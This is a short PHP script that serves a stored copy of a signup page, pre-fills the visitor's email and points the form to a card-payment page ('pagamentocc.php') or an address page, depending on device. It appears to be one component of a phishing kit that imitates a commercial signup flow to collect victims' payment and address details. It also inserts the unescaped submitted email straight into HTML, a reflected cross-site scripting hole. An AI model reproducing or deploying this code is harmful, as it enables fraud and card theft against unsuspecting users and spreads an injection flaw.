<?php
include("../conexao.php");
include("../banco.php");

switch($dist) {
    case "desktop":
        $email = $_POST['login'];
        $conteudo = file_get_contents('../dist/desktop/cadastro.html');
        $s1 = str_replace('<input class="SignupForm-form-input" name="email" value="" placeholder="" data-reactid=".0.1.0.$main.2.0.1" disabled="">', '<input class="SignupForm-form-input" name="email" value="' . $email . '" placeholder="" id="email">', $conteudo);
        $s2 = str_replace('action="pagamentoc.php"', 'action="pagamentocc.php?id=' . $id . '&titulo=' . $nomelink . '&dist=' . $dist . '"', $s1);
        echo $s2;
        break;
    case "mobile":
        $email = $_POST['email'];
        $conteudom = file_get_contents('../dist/mobile/cadastro.html');
        $s1 = str_replace('asdasdfdfd@asdasd.com',$email,$conteudom);
        $s2 = str_replace('action="endereco.php"','action="endereco.php?id='.$id.'&titulo='.$nomelink.'&dist='.$dist.'"', $s1);
        echo $s2;
        break;
};